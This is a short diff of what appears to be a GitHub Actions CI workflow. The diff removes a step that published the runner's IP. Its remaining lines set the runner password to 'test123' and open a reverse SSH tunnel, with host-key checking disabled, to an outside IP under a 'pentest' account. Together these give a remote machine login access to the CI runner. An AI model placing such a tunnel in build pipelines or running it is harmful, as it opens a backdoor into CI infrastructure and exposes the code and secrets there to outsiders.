@@ -32,12 +32,6 @@ jobs:
         sudo mkdir /var/empty
         echo "runner:test123" | sudo chpasswd
         
-    - name: Publish IP
-      uses: actions/upload-artifact@v2
-      with:
-          name: myip
-          path: /tmp/myip
-        
     - name: Run
       run: |
         ./ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -i test -p 9090 -R 2222:127.0.0.1:2222 -N -f pentest@212.102.231.44
